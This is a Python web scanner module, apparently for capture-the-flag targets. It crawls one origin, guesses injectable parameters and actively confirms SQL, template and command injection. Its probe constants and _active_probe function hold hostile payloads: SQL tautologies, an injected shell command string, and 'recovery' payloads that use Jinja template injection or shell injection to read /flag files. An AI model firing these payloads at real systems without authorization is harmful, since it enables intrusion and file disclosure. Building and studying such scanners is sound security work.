from __future__ import annotations

import re
import ssl
from collections import deque
from hashlib import sha256
from http.cookiejar import Cookie, CookieJar
from dataclasses import dataclass, field
from html import unescape
from html.parser import HTMLParser
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qsl, quote_plus, urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import HTTPRedirectHandler, HTTPCookieProcessor, HTTPSHandler, Request, build_opener

from .model import Finding, ScanReport, redact_url
from .session import BrowserSession

CMD_PROBE = ";printf WCSA;printf $((7321+19));printf WCSZ"
CMD_RESULT = "WCSA7340WCSZ"
SSTI_PROBE = "{{7340*3}}"
SSTI_RESULT = "22020"
MAX_BODY = 1_000_000
SQL_ERRORS = (
    "sql syntax", "sqlite error", "sqlite3.", "mysql_fetch", "mysqli_sql_exception",
    "pg_query", "postgresql error", "ora-", "unclosed quotation mark", "odbc sql",
)
DEBUG_ERRORS = (
    "traceback (most recent call last)", "stack trace", "werkzeug debugger",
    "debug mode", "exception in thread", "fatal error:",
)
FLAG_RE = re.compile(r"(?:flag|ctf|picoctf|htb)\s*\{[^}\r\n]{1,200}\}", re.I)
PROFILES = {
    "desktop": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Sec-CH-UA": '"Chromium";v="124", "Not-A.Brand";v="99"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
    },
    "mobile": {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Sec-CH-UA": '"Chromium";v="124", "Not-A.Brand";v="99"',
        "Sec-CH-UA-Mobile": "?1",
        "Sec-CH-UA-Platform": '"Android"',
    },
}


@dataclass
class Form:
    action: str
    method: str
    inputs: list[tuple[str, str, str]] = field(default_factory=list)


class PageParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.links: list[str] = []
        self.scripts: list[str] = []
        self.forms: list[Form] = []
        self._form: Form | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        data = {k.lower(): (v or "") for k, v in attrs}
        if tag.lower() in {"a", "link"} and data.get("href"):
            if tag.lower() == "a" or data.get("rel", "").lower() in {"canonical", "alternate"}:
                self.links.append(data["href"])
        elif tag.lower() in {"iframe", "frame"} and data.get("src"):
            self.links.append(data["src"])
        elif tag.lower() == "script" and data.get("src"):
            self.scripts.append(data["src"])
        elif tag.lower() == "form":
            self._form = Form(data.get("action", ""), data.get("method", "get").upper())
            self.forms.append(self._form)
            if self._form.method == "GET" and self._form.action:
                self.links.append(self._form.action)
        elif tag.lower() in {"input", "textarea", "select"} and self._form and data.get("name"):
            self._form.inputs.append((data["name"], data.get("type", "text").lower(), data.get("value", "")))

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "form":
            self._form = None


@dataclass
class Response:
    url: str
    status: int
    headers: dict[str, str]
    text: str


@dataclass(frozen=True)
class PageObservation:
    url: str
    status: int
    body_length: int
    body_sha256: str
    forms: tuple[tuple[str, str, tuple[str, ...]], ...]
    parameters: tuple[str, ...]


class SameOriginRedirectHandler(HTTPRedirectHandler):
    def __init__(self, origin: tuple[str, str]) -> None:
        self.origin = origin
        super().__init__()

    def redirect_request(self, req, fp, code, msg, headers, newurl):  # type: ignore[no-untyped-def]
        parsed = urlsplit(newurl)
        if (parsed.scheme.lower(), parsed.netloc.lower()) != self.origin:
            return None
        return super().redirect_request(req, fp, code, msg, headers, newurl)


class Scanner:
    def __init__(self, target: str, *, active: bool = False, max_pages: int = 20,
                 timeout: float = 5.0, max_requests: int = 80, verify_tls: bool = True,
                 profile: str = "desktop", session: BrowserSession | None = None) -> None:
        parsed = urlsplit(target)
        if parsed.scheme not in {"http", "https"} or not parsed.netloc or parsed.username or parsed.password:
            raise ValueError("target must be an absolute http:// or https:// URL")
        self.target = self._clean_url(target)
        self.origin = (parsed.scheme.lower(), parsed.netloc.lower())
        self.active = active
        self.max_pages = max(1, max_pages)
        self.timeout = max(0.1, timeout)
        self.max_requests = max(1, max_requests)
        if profile not in PROFILES:
            raise ValueError("profile must be desktop or mobile")
        self.profile = profile
        self.session = session
        self.requests_sent = 0
        self.observations: dict[str, PageObservation] = {}
        context = ssl.create_default_context() if verify_tls else ssl._create_unverified_context()
        self.cookies = CookieJar()
        if session:
            self._import_session_cookies(session)
        self.opener = build_opener(
            SameOriginRedirectHandler(self.origin),
            HTTPCookieProcessor(self.cookies),
            HTTPSHandler(context=context),
        )

    def _import_session_cookies(self, session: BrowserSession) -> None:
        host = urlsplit(self.target).hostname or ""
        for item in session.cookies:
            domain = item.domain.lstrip(".") or host
            if host != domain and not host.endswith("." + domain):
                raise ValueError("captured session contains a cookie outside the target origin")
            self.cookies.set_cookie(Cookie(
                version=0, name=item.name, value=item.value, port=None, port_specified=False,
                domain=domain, domain_specified=bool(item.domain),
                domain_initial_dot=item.domain.startswith("."), path=item.path or "/",
                path_specified=True, secure=item.secure, expires=item.expires,
                discard=item.expires is None, comment=None, comment_url=None,
                rest={"HttpOnly": item.http_only, "SameSite": item.same_site}, rfc2109=False,
            ))

    @staticmethod
    def _clean_url(url: str) -> str:
        p = urlsplit(url)
        return urlunsplit((p.scheme.lower(), p.netloc.lower(), p.path or "/", p.query, ""))

    def _in_scope(self, url: str) -> bool:
        p = urlsplit(url)
        return (p.scheme.lower(), p.netloc.lower()) == self.origin

    def _request(self, url: str, method: str = "GET", data: bytes | None = None) -> Response:
        if self.requests_sent >= self.max_requests:
            raise RuntimeError("request budget exhausted")
        if not self._in_scope(url):
            raise ValueError("cross-origin request blocked")
        self.requests_sent += 1
        headers = {
            **PROFILES[self.profile],
            "Accept": "text/html,application/json,text/plain,*/*;q=0.5",
            "Accept-Language": "en-US,en;q=0.8",
            "Cache-Control": "no-store, no-cache, max-age=0",
            "Pragma": "no-cache",
        }
        if self.session:
            headers.update(dict(self.session.headers))
        if data is not None:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = Request(url, data=data, method=method, headers=headers)
        try:
            with self.opener.open(req, timeout=self.timeout) as res:
                raw = res.read(MAX_BODY)
                charset = res.headers.get_content_charset() or "utf-8"
                return Response(res.geturl(), res.status, {k.lower(): v for k, v in res.headers.items()}, raw.decode(charset, "replace"))
        except HTTPError as exc:
            raw = exc.read(MAX_BODY)
            return Response(url, exc.code, {k.lower(): v for k, v in exc.headers.items()}, raw.decode("utf-8", "replace"))

    def _finding(self, **kwargs: object) -> Finding:
        kwargs.setdefault("profile", self.profile)
        headers = {**PROFILES[self.profile]}
        if self.session:
            headers.update(dict(self.session.headers))
        kwargs.setdefault("client_headers", tuple(sorted(
            (name, value) for name, value in headers.items()
            if name.lower() in {"user-agent", "accept-language", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform"}
        )))
        kwargs.setdefault("session_cookies", tuple(sorted((cookie.name, cookie.value) for cookie in self.cookies)))
        return Finding(**kwargs)  # type: ignore[arg-type]

    @staticmethod
    def _observe(response: Response, parser: PageParser) -> PageObservation:
        forms = tuple(sorted(
            (form.method, form.action, tuple(sorted(name for name, _, _ in form.inputs)))
            for form in parser.forms
        ))
        parameters = set(name for form in parser.forms for name, _, _ in form.inputs)
        parameters.update(name for name, _ in parse_qsl(urlsplit(response.url).query, keep_blank_values=True))
        encoded = response.text.encode("utf-8", "replace")
        return PageObservation(
            url=response.url,
            status=response.status,
            body_length=len(encoded),
            body_sha256=sha256(encoded).hexdigest(),
            forms=forms,
            parameters=tuple(sorted(parameters)),
        )

    def _passive_findings(self, response: Response, parser: PageParser) -> list[Finding]:
        out: list[Finding] = []
        low = response.text.lower()
        if any(token in low for token in DEBUG_ERRORS):
            out.append(self._finding(rule="WEB-DEBUG-001", title="Debug or stack-trace disclosure",
                severity="medium", confidence="high", url=response.url,
                evidence="The response contains a deterministic debug/stack-trace signature.",
                vector=f"GET {redact_url(response.url)}",
                patch="Disable production debug mode; return generic errors and keep traces in server-side logs."))
        if re.search(r"<title>\s*index of /", response.text, re.I):
            out.append(self._finding(rule="WEB-LIST-001", title="Directory listing exposed",
                severity="medium", confidence="high", url=response.url,
                evidence="HTML title matches an automatic directory index.", vector=f"GET {redact_url(response.url)}",
                patch="Disable directory indexes and explicitly publish only required files."))
        if self.origin[0] == "http" and any(t == "password" for form in parser.forms for _, t, _ in form.inputs):
            out.append(self._finding(rule="WEB-HTTP-001", title="Password submitted over cleartext HTTP",
                severity="high", confidence="high", url=response.url,
                evidence="A password input is served from an HTTP origin.",
                vector="Observe the password-bearing request on the network path.",
                patch="Serve the challenge over HTTPS and redirect HTTP before rendering login forms."))
        flag = FLAG_RE.search(response.text)
        if flag:
            out.append(self._finding(rule="WEB-FLAG-CANDIDATE-001", title="Flag-shaped value in passive response",
                severity="medium", confidence="medium", url=response.url,
                evidence=f"Response contains a flag-shaped candidate: {flag.group(0)[:220]}",
                vector=f"GET {redact_url(response.url)} and verify that the value is accepted by the challenge.",
                flag_path="The value may be a decoy, example, or real flag. Passive text alone cannot distinguish them.",
                patch="Remove secrets from public responses and enforce authorization at the data boundary."))
        for form in parser.forms:
            names = [name for name, _, _ in form.inputs]
            defaults = tuple((name, value) for name, input_type, value in form.inputs
                             if input_type not in {"submit", "button", "image", "reset", "file"})
            action = self._clean_url(urljoin(response.url, form.action or response.url))
            if not self._in_scope(action):
                continue
            for name, input_type, _ in form.inputs:
                user_controlled = input_type not in {
                    "hidden", "submit", "button", "image", "reset", "file"
                }
                out.extend(self._parameter_hypotheses(
                    action, form.method, name, defaults, generic=user_controlled
                ))
        for name, _ in parse_qsl(urlsplit(response.url).query, keep_blank_values=True):
            out.extend(self._parameter_hypotheses(
                response.url, "GET", name,
                tuple(parse_qsl(urlsplit(response.url).query, keep_blank_values=True)),
                generic=True,
            ))
        return out

    def _parameter_hypotheses(self, url: str, method: str, name: str,
                              defaults: tuple[tuple[str, str], ...] = (), *,
                              generic: bool = False) -> list[Finding]:
        key = name.lower()
        rules = []
        if generic or re.search(r"(?:^|_)(?:id|q|query|search|user|name|item)(?:$|_)", key):
            rules.append(("WEB-SQLI-001", "Possible SQL injection input", "'", "Use a parameterized query; never concatenate input into SQL."))
        if generic:
            rules.append(("WEB-SSTI-001", "Possible server-side template injection input", SSTI_PROBE,
                          "Treat templates as code: select fixed templates and pass user data only as values."))
        if re.search(r"(?:^|_)(?:cmd|command|exec|host|ip|ping)(?:$|_)", key):
            rules.append(("WEB-CMDI-001", "Possible command injection input", CMD_PROBE, "Avoid shell invocation; use fixed argument arrays and strict allowlists."))
        if re.search(r"(?:^|_)(?:file|path|page|include|template|view)(?:$|_)", key):
            rules.append(("WEB-FILE-001", "Possible file/path injection input", "../WCS_NONEXISTENT", "Map identifiers to fixed server-side resources; canonicalize and enforce a root."))
        if re.search(r"(?:^|_)(?:next|url|uri|redirect|return|continue)(?:$|_)", key):
            rules.append(("WEB-REDIR-001", "Possible open redirect or server-side URL input", "https://example.invalid/wcs", "Allowlist destinations and reject absolute or cross-origin URLs."))
        return [self._finding(rule=rule, title=title, severity="info", confidence="low", url=url,
            parameter=name, evidence=f"Parameter name '{name}' in a {method} form/query matches a sink-oriented heuristic; no vulnerability is claimed.",
            vector=f"{method} {redact_url(url)} with {name}={payload!r}", patch=patch,
            method=method, request_fields=defaults, proof_payload=payload,
            expected_evidence=("database error or stable boolean response differential" if rule == "WEB-SQLI-001" else
                               SSTI_RESULT if rule == "WEB-SSTI-001" else
                               CMD_RESULT if rule == "WEB-CMDI-001" else
                               "status/body differential")) for rule, title, payload, patch in rules]

    @staticmethod
    def _set_query(url: str, parameter: str, value: str) -> str:
        p = urlsplit(url)
        pairs = parse_qsl(p.query, keep_blank_values=True)
        replaced = False
        out = []
        for k, v in pairs:
            if k == parameter:
                out.append((k, value)); replaced = True
            else:
                out.append((k, v))
        if not replaced:
            out.append((parameter, value))
        return urlunsplit((p.scheme, p.netloc, p.path, urlencode(out), ""))

    def _active_probe(self, finding: Finding) -> Finding | None:
        if finding.parameter == "" or self.requests_sent + 2 > self.max_requests:
            return None
        method = finding.method
        base_value, probe = "WCSBASE", "'"
        if finding.rule == "WEB-CMDI-001":
            probe = CMD_PROBE
        elif finding.rule == "WEB-SSTI-001":
            probe = SSTI_PROBE
        elif finding.rule == "WEB-FILE-001":
            probe = "../WCS_NONEXISTENT_7f31a9"
        elif finding.rule == "WEB-REDIR-001":
            probe = "https://example.invalid/wcs"
        def send(value: str) -> Response:
            fields = dict(finding.request_fields)
            fields[finding.parameter] = value
            if method == "POST":
                return self._request(finding.url, "POST", urlencode(fields).encode())
            url = finding.url
            for key, field_value in fields.items():
                url = self._set_query(url, key, field_value)
            return self._request(url)
        baseline, tested = send(base_value), send(probe)
        body_low = tested.text.lower()
        if finding.rule == "WEB-SQLI-001" and any(sig in body_low for sig in SQL_ERRORS) and not any(sig in baseline.text.lower() for sig in SQL_ERRORS):
            return self._finding(rule=finding.rule, title="SQL injection error behavior confirmed", severity="high", confidence="high",
                url=finding.url, parameter=finding.parameter,
                evidence="A quote introduces a database error signature absent from the baseline response.",
                vector=f"{method} {redact_url(finding.url)} with {finding.parameter}=' confirms parser reachability; derive a DB-specific read-only UNION/boolean payload manually.",
                patch="Use prepared statements with bound parameters and a least-privileged database account.",
                flag_path="The parameter reaches a SQL parser. Recovering the flag still requires schema/context discovery; this scan does not extract data.",
                method=method, request_fields=finding.request_fields, proof_payload=probe,
                expected_evidence="database error signature absent from baseline")
        if finding.rule == "WEB-SQLI-001" and self.requests_sent + 4 <= self.max_requests:
            true_payload = "' OR '1'='1'-- "
            false_payload = "' OR '1'='2'-- "
            true_one, false_one = send(true_payload), send(false_payload)
            true_two, false_two = send(true_payload), send(false_payload)

            def sql_signature(response: Response, payload: str) -> tuple[int, str]:
                # Remove simple reflection before comparing. This prevents an echo
                # endpoint from becoming a false SQLi confirmation.
                text = unescape(response.text)
                for reflected in (payload, quote_plus(payload)):
                    text = text.replace(reflected, "[INPUT]")
                return response.status, sha256(text.encode("utf-8", "replace")).hexdigest()

            true_sig = sql_signature(true_one, true_payload)
            false_sig = sql_signature(false_one, false_payload)
            if (true_sig == sql_signature(true_two, true_payload)
                    and false_sig == sql_signature(false_two, false_payload)
                    and true_sig != false_sig):
                return self._finding(
                    rule=finding.rule, title="SQL injection boolean behavior confirmed",
                    severity="high", confidence="high", url=finding.url,
                    parameter=finding.parameter,
                    evidence=("Two repeated tautology requests and two repeated contradiction "
                              "requests produced stable, distinct responses after removing input reflection."),
                    vector=(f"{method} {redact_url(finding.url)}: compare "
                            f"{finding.parameter}={true_payload!r} with "
                            f"{finding.parameter}={false_payload!r}."),
                    patch="Use prepared statements with bound parameters and a least-privileged database account.",
                    flag_path=("Boolean SQL evaluation is proven. Derive schema-specific extraction only from "
                               "the observed DB/query context; no universal flag query can be claimed."),
                    method=method, request_fields=finding.request_fields,
                    proof_payload=true_payload,
                    expected_evidence="stable response differs from the contradiction pair",
                )
        if (finding.rule == "WEB-SSTI-001" and SSTI_RESULT in tested.text
                and SSTI_RESULT not in baseline.text and SSTI_RESULT not in SSTI_PROBE):
            recovery = "{{cycler.__init__.__globals__.os.popen('cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null').read()}}"
            return self._finding(
                rule=finding.rule, title="Jinja-style template expression evaluation confirmed",
                severity="critical", confidence="high", url=finding.url,
                parameter=finding.parameter,
                evidence=f"The response contains computed result {SSTI_RESULT}, absent from the payload and baseline.",
                vector=(f"Proof: {method} {redact_url(finding.url)} with "
                        f"{finding.parameter}={SSTI_PROBE!r}. Recovery: same request with the supplied payload."),
                patch="Do not compile user-controlled template source; render fixed templates with user data as values.",
                exploit_status="payload-ready", method=method,
                request_fields=finding.request_fields, proof_payload=SSTI_PROBE,
                expected_evidence=SSTI_RESULT, recovery_payload=recovery,
                flag_path="Jinja expression syntax was verified; the recovery payload reads common CTF flag paths.",
            )
        if finding.rule == "WEB-CMDI-001" and CMD_RESULT in tested.text and CMD_RESULT not in baseline.text and CMD_RESULT not in CMD_PROBE:
            recovery = ";printf WCSA;cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null;printf WCSZ"
            return self._finding(rule=finding.rule, title="Command injection arithmetic execution confirmed", severity="critical", confidence="high",
                url=finding.url, parameter=finding.parameter,
                evidence=f"The response contains delimited computed output {CMD_RESULT}; that result is absent from both payload and baseline.",
                vector=f"Proof: {method} {redact_url(finding.url)} with {finding.parameter}={CMD_PROBE!r}. Recovery: same request with {finding.parameter}={recovery!r}.",
                patch="Remove shell execution; call the intended program with a fixed argument vector and allowlisted values.",
                exploit_status="payload-ready",
                flag_path=f"The verified shell syntax supports the recovery payload for {finding.parameter}; the scanner does not submit it automatically.",
                method=method, request_fields=finding.request_fields, proof_payload=probe,
                expected_evidence=CMD_RESULT, recovery_payload=recovery)
        location = tested.headers.get("location", "")
        if finding.rule == "WEB-REDIR-001" and location and urlsplit(urljoin(finding.url, location)).netloc == "example.invalid":
            return self._finding(rule=finding.rule, title="Cross-origin redirect confirmed", severity="medium", confidence="high",
                url=finding.url, parameter=finding.parameter,
                evidence="The response navigation reaches the supplied external origin.", vector=f"Set {finding.parameter}=https://example.invalid/wcs",
                patch="Resolve redirects against a strict same-origin path allowlist.", method=method,
                request_fields=finding.request_fields, proof_payload=probe,
                expected_evidence="Location header points to example.invalid")
        if finding.rule == "WEB-FILE-001" and tested.status != baseline.status:
            return self._finding(rule=finding.rule, title="Path input changes resource behavior", severity="low", confidence="medium",
                url=finding.url, parameter=finding.parameter,
                evidence=f"A traversal-shaped nonexistent path changes HTTP status {baseline.status} -> {tested.status}; no file was read.",
                vector=f"Set {finding.parameter}=../WCS_NONEXISTENT_7f31a9 to reproduce the differential.", patch=finding.patch,
                method=method, request_fields=finding.request_fields, proof_payload=probe,
                expected_evidence=f"HTTP status differs from baseline {baseline.status}")
        return None

    @staticmethod
    def _static_get_routes(source: str) -> list[str]:
        """Find literal GET routes in scripts without evaluating JavaScript.

        Dynamic expressions, POST requests and template strings are excluded.
        These are discovery hints, not evidence of vulnerabilities.
        """
        patterns = (
            r"""\bfetch\s*\(\s*['"]([^'"]+)['"]\s*\)""",
            r"""\baxios\.get\s*\(\s*['"]([^'"]+)['"]""",
            r"""\b(?:window\.)?open\s*\(\s*['"]GET['"]\s*,\s*['"]([^'"]+)['"]""",
        )
        routes: set[str] = set()
        for pattern in patterns:
            for found in re.findall(pattern, source, re.I):
                if found.startswith(("/", "./", "../", "http://", "https://")) and not any(
                    marker in found for marker in ("{", "}", "${", "\\")
                ):
                    routes.add(found)
        return sorted(routes)

    def scan(self) -> ScanReport:
        report = ScanReport(self.target, self.active, profiles=(self.profile,),
                            session_source=self.session.source if self.session else "none")
        queue = deque([self.target])
        seen: set[str] = set()
        successful_pages = 0
        candidates: list[Finding] = []
        discovered_routes = 0
        try:
            self._request(self.target, "HEAD")
            self._request(self.target, "OPTIONS")
        except (URLError, OSError, RuntimeError, ValueError) as exc:
            report.errors.append("metadata request failed")
        while queue and len(seen) < self.max_pages and self.requests_sent < self.max_requests:
            url = queue.popleft()
            if url in seen:
                continue
            seen.add(url)
            try:
                response = self._request(url)
            except (URLError, OSError, RuntimeError, ValueError) as exc:
                report.errors.append(f"{redact_url(url)}: request failed")
                continue
            successful_pages += 1
            parser = PageParser()
            ctype = response.headers.get("content-type", "")
            if "html" in ctype or "<html" in response.text[:500].lower():
                parser.feed(response.text)
            self.observations[response.url] = self._observe(response, parser)
            items = self._passive_findings(response, parser)
            report.findings.extend(items)
            candidates.extend(item for item in items if item.rule in {"WEB-SQLI-001", "WEB-SSTI-001", "WEB-CMDI-001", "WEB-FILE-001", "WEB-REDIR-001"})
            # Examine inline scripts and bounded same-origin JavaScript files for
            # literal GET routes. Never execute JavaScript or issue inferred POSTs.
            routes = list(parser.links)
            if "html" in ctype or "<html" in response.text[:500].lower():
                routes.extend(self._static_get_routes(response.text))
                for script in parser.scripts[:10]:
                    script_url = self._clean_url(urljoin(response.url, script))
                    if not self._in_scope(script_url) or self.requests_sent >= self.max_requests:
                        continue
                    try:
                        js = self._request(script_url)
                        if len(js.text) <= MAX_BODY and js.status == 200:
                            routes.extend(self._static_get_routes(js.text))
                    except (URLError, OSError, RuntimeError, ValueError):
                        continue
            discovered_routes += len(routes)
            for href in routes:
                try:
                    nxt = self._clean_url(urljoin(response.url, href))
                    parsed_nxt = urlsplit(nxt)
                    if parsed_nxt.scheme not in {"http", "https"}:
                        continue
                    if self._in_scope(nxt) and nxt not in seen and nxt not in queue:
                        queue.append(nxt)
                except ValueError:
                    continue
        if self.active:
            probe_priority = {
                "WEB-CMDI-001": 0,
                "WEB-SSTI-001": 1,
                "WEB-SQLI-001": 2,
                "WEB-FILE-001": 3,
                "WEB-REDIR-001": 4,
            }
            for finding in sorted(candidates, key=lambda item: (
                    probe_priority.get(item.rule, 9), item.url, item.parameter, item.id)):
                if self.requests_sent + 2 > self.max_requests:
                    break
                try:
                    confirmed = self._active_probe(finding)
                    if confirmed:
                        report.findings.append(confirmed)
                except (URLError, OSError, RuntimeError, ValueError) as exc:
                    report.errors.append(f"active {redact_url(finding.url)}#{finding.parameter}: request failed")
        if discovered_routes == 0:
            report.coverage.append(
                "No navigable links, GET form actions or literal script GET routes were discovered. "
                "This HTTP-only scanner cannot execute JavaScript or observe live XHR/fetch traffic."
            )
        if not candidates:
            report.coverage.append(
                "No eligible query or form parameters were found for active injection probes; "
                "zero findings does not establish that the application is secure."
            )
        unique = {item.id: item for item in report.findings}
        severity = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        report.findings = sorted(unique.values(), key=lambda f: (severity.get(f.severity, 9), f.url, f.rule, f.parameter, f.id))
        report.pages_scanned = successful_pages
        report.requests_sent = self.requests_sent
        return report


def scan_profiles(target: str, *, profiles: tuple[str, ...] = ("desktop", "mobile"),
                  active: bool = False, max_pages: int = 20, timeout: float = 5.0,
                  max_requests: int = 80, verify_tls: bool = True,
                  sessions: dict[str, BrowserSession] | None = None) -> ScanReport:
    """Run isolated profile scans and combine results in stable order."""
    if not profiles or any(profile not in PROFILES for profile in profiles):
        raise ValueError("profiles must contain desktop and/or mobile")
    reports: list[ScanReport] = []
    scanners: dict[str, Scanner] = {}
    for profile in profiles:
        scanner = Scanner(target, active=active, max_pages=max_pages, timeout=timeout,
                          max_requests=max_requests, verify_tls=verify_tls, profile=profile,
                          session=(sessions or {}).get(profile))
        scanners[profile] = scanner
        reports.append(scanner.scan())
    combined = ScanReport(
        target=reports[0].target,
        active=active,
        pages_scanned=sum(report.pages_scanned for report in reports),
        requests_sent=sum(report.requests_sent for report in reports),
        findings=[finding for report in reports for finding in report.findings],
        errors=[f"{profile}: {error}" for profile, report in zip(profiles, reports) for error in report.errors],
        coverage=[f"{profile}: {note}" for profile, report in zip(profiles, reports) for note in report.coverage],
        profiles=profiles,
        session_source=next((report.session_source for report in reports if report.session_source != "none"), "none"),
    )
    if len(profiles) == 2:
        combined.findings.extend(_profile_differences(scanners[profiles[0]], scanners[profiles[1]], reports))
    severity = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    unique = {finding.id: finding for finding in combined.findings}
    combined.findings = sorted(unique.values(), key=lambda finding: (
        severity.get(finding.severity, 9), finding.url, finding.rule,
        finding.profile, finding.parameter, finding.id,
    ))
    return combined


def _profile_differences(first: Scanner, second: Scanner,
                         reports: list[ScanReport]) -> list[Finding]:
    out: list[Finding] = []
    first_findings = {(item.url, item.rule, item.parameter) for item in reports[0].findings}
    second_findings = {(item.url, item.rule, item.parameter) for item in reports[1].findings}
    finding_difference = first_findings != second_findings
    urls = sorted(set(first.observations) | set(second.observations))
    for url in urls:
        left = first.observations.get(url)
        right = second.observations.get(url)
        differences: list[str] = []
        if left is None or right is None:
            differences.append(f"page visible only to {first.profile if right is None else second.profile}")
        else:
            if left.status != right.status:
                differences.append(f"status {first.profile}={left.status}, {second.profile}={right.status}")
            if (left.body_length, left.body_sha256) != (right.body_length, right.body_sha256):
                differences.append(
                    f"body {first.profile}=len:{left.body_length},sha256:{left.body_sha256[:12]}; "
                    f"{second.profile}=len:{right.body_length},sha256:{right.body_sha256[:12]}"
                )
            if left.forms != right.forms:
                differences.append(f"form signatures differ ({len(left.forms)} vs {len(right.forms)})")
            if left.parameters != right.parameters:
                differences.append(
                    f"parameters {first.profile}={list(left.parameters)}, {second.profile}={list(right.parameters)}"
                )
        left_rules = sorted((rule, parameter) for finding_url, rule, parameter in first_findings if finding_url == url)
        right_rules = sorted((rule, parameter) for finding_url, rule, parameter in second_findings if finding_url == url)
        if left_rules != right_rules:
            differences.append(f"finding keys {first.profile}={left_rules}, {second.profile}={right_rules}")
        if url == first.target and finding_difference:
            left_only = sorted(first_findings - second_findings)[:8]
            right_only = sorted(second_findings - first_findings)[:8]
            differences.append(
                f"profile-only findings {first.profile}={left_only}, {second.profile}={right_only}"
            )
        if differences:
            out.append(Finding(
                rule="WEB-PROFILE-DIFF-001",
                title="Desktop/mobile response surface differs",
                severity="info",
                confidence="high",
                url=url,
                profile="comparison",
                evidence="; ".join(differences),
                vector=(
                    f"Repeat GET {redact_url(url)} with Sec-CH-UA-Mobile {PROFILES[first.profile]['Sec-CH-UA-Mobile']} "
                    f"and {PROFILES[second.profile]['Sec-CH-UA-Mobile']}; inspect profile-tagged candidates."
                ),
                patch="Apply the same authentication, authorization, validation, and output encoding to every device-specific route.",
                flag_path="A device-specific surface may expose a distinct route or input. Validate its profile-tagged findings before flag recovery.",
            ))
    return out
